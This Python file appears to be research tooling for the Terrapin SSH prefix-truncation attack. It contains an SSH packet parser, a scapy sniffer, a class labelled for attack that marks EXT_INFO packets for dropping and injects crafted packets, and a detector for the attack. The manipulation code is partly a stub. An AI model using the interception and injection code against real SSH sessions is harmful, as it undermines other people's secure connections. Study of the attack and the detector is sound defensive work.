#!/usr/bin/env python3
"""
Packet Interceptor for Terrapin Attack
Advanced packet manipulation and inspection
"""

import struct
import hashlib
import hmac
from typing import Optional, Dict, List, Tuple
from scapy.all import *
from scapy.layers.inet import IP, TCP

# SSH Message Types
SSH_MSG_TYPES = {
    1: 'SSH_MSG_DISCONNECT',
    2: 'SSH_MSG_IGNORE',
    3: 'SSH_MSG_UNIMPLEMENTED',
    4: 'SSH_MSG_DEBUG',
    5: 'SSH_MSG_SERVICE_REQUEST',
    6: 'SSH_MSG_SERVICE_ACCEPT',
    7: 'SSH_MSG_EXT_INFO',
    20: 'SSH_MSG_KEXINIT',
    21: 'SSH_MSG_NEWKEYS',
    30: 'SSH_MSG_KEX_ECDH_INIT',
    31: 'SSH_MSG_KEX_ECDH_REPLY',
    50: 'SSH_MSG_USERAUTH_REQUEST',
    51: 'SSH_MSG_USERAUTH_FAILURE',
    52: 'SSH_MSG_USERAUTH_SUCCESS',
    90: 'SSH_MSG_CHANNEL_OPEN',
    91: 'SSH_MSG_CHANNEL_OPEN_CONFIRMATION',
    94: 'SSH_MSG_CHANNEL_DATA',
}


class SSHPacket:
    """
    Represents an SSH protocol packet
    """
    
    def __init__(self, data: bytes):
        """
        Parse SSH packet
        
        Args:
            data: Raw packet data
        """
        self.raw_data = data
        self.packet_length = 0
        self.padding_length = 0
        self.payload = b''
        self.padding = b''
        self.mac = b''
        self.message_type = None
        self.encrypted = False
        
        self._parse()
    
    def _parse(self):
        """
        Parse packet structure
        """
        if len(self.raw_data) < 5:
            self.encrypted = True
            return
        
        try:
            # Parse packet length
            self.packet_length = struct.unpack('>I', self.raw_data[:4])[0]
            
            # Parse padding length
            self.padding_length = self.raw_data[4]
            
            # Calculate payload length
            payload_length = self.packet_length - self.padding_length - 1
            
            if len(self.raw_data) >= 5 + payload_length:
                # Extract payload
                self.payload = self.raw_data[5:5+payload_length]
                
                # Extract message type
                if len(self.payload) > 0:
                    self.message_type = self.payload[0]
                
                # Extract padding
                padding_start = 5 + payload_length
                padding_end = padding_start + self.padding_length
                if len(self.raw_data) >= padding_end:
                    self.padding = self.raw_data[padding_start:padding_end]
                
                # MAC (if present)
                if len(self.raw_data) > padding_end:
                    self.mac = self.raw_data[padding_end:]
            else:
                self.encrypted = True
                
        except Exception:
            self.encrypted = True
    
    def __str__(self):
        """String representation"""
        if self.encrypted:
            return f"SSHPacket(encrypted, length={len(self.raw_data)})"
        
        msg_name = SSH_MSG_TYPES.get(self.message_type, f'UNKNOWN({self.message_type})')
        return f"SSHPacket(type={msg_name}, length={self.packet_length})"
    
    def is_kexinit(self) -> bool:
        """Check if this is a KEXINIT packet"""
        return self.message_type == 20
    
    def is_newkeys(self) -> bool:
        """Check if this is a NEWKEYS packet"""
        return self.message_type == 21
    
    def is_ext_info(self) -> bool:
        """Check if this is an EXT_INFO packet"""
        return self.message_type == 7


class PacketInterceptor:
    """
    Intercepts and manipulates SSH packets
    """
    
    def __init__(self, interface: str = 'eth0'):
        """
        Initialize packet interceptor
        
        Args:
            interface: Network interface to sniff on
        """
        self.interface = interface
        self.packets_captured = []
        self.client_ip = None
        self.server_ip = None
        self.client_port = None
        self.server_port = None
        
    def set_endpoints(self, client_ip: str, client_port: int,
                     server_ip: str, server_port: int):
        """
        Set the endpoints for filtering
        
        Args:
            client_ip: Client IP address
            client_port: Client port
            server_ip: Server IP address
            server_port: Server port
        """
        self.client_ip = client_ip
        self.client_port = client_port
        self.server_ip = server_ip
        self.server_port = server_port
    
    def start_capture(self, callback=None):
        """
        Start capturing packets
        
        Args:
            callback: Function to call for each packet
        """
        filter_str = f"tcp and host {self.server_ip} and port {self.server_port}"
        
        print(f"[*] Starting packet capture on {self.interface}")
        print(f"[*] Filter: {filter_str}")
        
        sniff(
            iface=self.interface,
            filter=filter_str,
            prn=lambda pkt: self._process_packet(pkt, callback),
            store=False
        )
    
    def _process_packet(self, packet, callback):
        """
        Process a captured packet
        
        Args:
            packet: Scapy packet
            callback: Callback function
        """
        if TCP in packet and Raw in packet:
            # Extract SSH data
            ssh_data = bytes(packet[Raw].load)
            
            # Parse SSH packet
            ssh_packet = SSHPacket(ssh_data)
            
            # Store packet
            self.packets_captured.append({
                'timestamp': packet.time,
                'src': packet[IP].src,
                'dst': packet[IP].dst,
                'sport': packet[TCP].sport,
                'dport': packet[TCP].dport,
                'ssh_packet': ssh_packet,
                'scapy_packet': packet
            })
            
            # Call callback
            if callback:
                callback(packet, ssh_packet)
            
            # Print packet info
            direction = "C->S" if packet[TCP].dport == self.server_port else "S->C"
            print(f"[{direction}] {ssh_packet}")
    
    def find_ext_info_packets(self) -> List[Dict]:
        """
        Find all EXT_INFO packets in capture
        
        Returns:
            List of EXT_INFO packet records
        """
        ext_info_packets = []
        
        for record in self.packets_captured:
            if record['ssh_packet'].is_ext_info():
                ext_info_packets.append(record)
        
        return ext_info_packets
    
    def find_newkeys_packets(self) -> List[Dict]:
        """
        Find all NEWKEYS packets in capture
        
        Returns:
            List of NEWKEYS packet records
        """
        newkeys_packets = []
        
        for record in self.packets_captured:
            if record['ssh_packet'].is_newkeys():
                newkeys_packets.append(record)
        
        return newkeys_packets
    
    def export_capture(self, filename: str):
        """
        Export captured packets to PCAP file
        
        Args:
            filename: Output filename
        """
        packets = [record['scapy_packet'] for record in self.packets_captured]
        wrpcap(filename, packets)
        print(f"[*] Exported {len(packets)} packets to {filename}")


class PacketManipulator:
    """
    Manipulates SSH packets for attack
    """
    
    @staticmethod
    def drop_ext_info(packet: bytes) -> Optional[bytes]:
        """
        Check if packet is EXT_INFO and should be dropped
        
        Args:
            packet: Raw packet data
            
        Returns:
            None if packet should be dropped, packet data otherwise
        """
        ssh_pkt = SSHPacket(packet)
        
        if ssh_pkt.is_ext_info():
            print("[!] EXT_INFO packet detected - DROPPING")
            return None
        
        return packet
    
    @staticmethod
    def modify_kexinit(packet: bytes, remove_extension: str = 'ext-info-c') -> bytes:
        """
        Modify KEXINIT packet to remove extension
        
        Args:
            packet: Original KEXINIT packet
            remove_extension: Extension to remove
            
        Returns:
            Modified packet
        """
        ssh_pkt = SSHPacket(packet)
        
        if not ssh_pkt.is_kexinit():
            return packet
        
        # TODO: Implement KEXINIT modification
        # This would involve parsing and rebuilding the KEXINIT packet
        
        return packet
    
    @staticmethod
    def inject_packet(sock, packet_type: int, payload: bytes = b''):
        """
        Inject a custom SSH packet
        
        Args:
            sock: Socket to send on
            packet_type: SSH message type
            payload: Packet payload
        """
        # Build packet
        packet_data = struct.pack('B', packet_type) + payload
        
        # Add padding
        padding_length = 8 - ((len(packet_data) + 5) % 8)
        if padding_length < 4:
            padding_length += 8
        
        padding = os.urandom(padding_length)
        
        # Build final packet
        packet_length = len(packet_data) + padding_length + 1
        packet = struct.pack('>I', packet_length)
        packet += struct.pack('B', padding_length)
        packet += packet_data
        packet += padding
        
        sock.send(packet)


class TerrapinDetector:
    """
    Detects Terrapin attack attempts
    """
    
    def __init__(self):
        self.newkeys_seen = False
        self.ext_info_expected = False
        self.ext_info_received = False
        self.sequence_counter = 0
    
    def on_newkeys(self):
        """
        Called when NEWKEYS is seen
        """
        self.newkeys_seen = True
        self.ext_info_expected = True
        self.sequence_counter = 0
    
    def on_packet(self, ssh_packet: SSHPacket):
        """
        Process packet for attack detection
        
        Args:
            ssh_packet: SSH packet to analyze
        """
        if self.newkeys_seen and self.ext_info_expected:
            self.sequence_counter += 1
            
            if ssh_packet.is_ext_info():
                self.ext_info_received = True
                self.ext_info_expected = False
                
                if self.sequence_counter != 1:
                    print("[!] ATTACK DETECTED: EXT_INFO sequence number anomaly")
                    return True
            
            # If we've seen multiple packets without EXT_INFO
            if self.sequence_counter > 3 and not self.ext_info_received:
                print("[!] ATTACK DETECTED: Missing EXT_INFO after NEWKEYS")
                return True
        
        return False
    
    def is_attack_detected(self) -> bool:
        """
        Check if attack was detected
        
        Returns:
            bool: True if attack detected
        """
        if self.newkeys_seen and self.ext_info_expected and not self.ext_info_received:
            return self.sequence_counter > 3
        return False


def test_packet_parser():
    """
    Test the packet parser
    """
    print("[*] Testing SSH packet parser...")
    
    # Create a test KEXINIT packet
    cookie = os.urandom(16)
    payload = struct.pack('B', 20) + cookie  # SSH_MSG_KEXINIT + cookie
    
    padding_length = 8 - ((len(payload) + 5) % 8)
    if padding_length < 4:
        padding_length += 8
    
    padding = os.urandom(padding_length)
    packet_length = len(payload) + padding_length + 1
    
    packet = struct.pack('>I', packet_length)
    packet += struct.pack('B', padding_length)
    packet += payload
    packet += padding
    
    # Parse it
    ssh_pkt = SSHPacket(packet)
    print(f"[+] Parsed: {ssh_pkt}")
    print(f"[+] Is KEXINIT: {ssh_pkt.is_kexinit()}")


if __name__ == '__main__':
    test_packet_parser()
